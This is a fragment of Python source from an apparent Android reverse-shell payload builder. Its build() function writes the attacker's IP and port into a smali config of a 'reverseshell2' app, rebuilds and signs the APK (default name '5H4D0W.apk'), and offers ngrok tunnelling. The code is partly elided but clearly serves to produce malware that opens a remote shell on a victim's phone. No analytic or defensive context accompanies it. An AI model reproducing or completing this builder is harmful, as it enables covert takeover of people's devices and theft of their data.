...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    editor = "payload"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
    ...
    outFileName = output if output else "5H4D0W.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar engine/apktool.jar b payload  -o "+outFileName,que],)
    t.start()
    while t.is_alive(): animate("Building Payload... ")
    t.join()
    print(" ")
    resOut = que.get()
    if not resOut.returncode:
        ...
        t = threading.Thread(target=executeCMD,args=["java -jar engine/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing Payload... ")
        t.join()
        print(" ")
        resOut = que.get()
        if not resOut.returncode:
            print(stdOutput("success")+"Successfully signed the Payload \033[1m\033[32m"+outFileName+"\033[0m")
            if ngrok:
                clear()
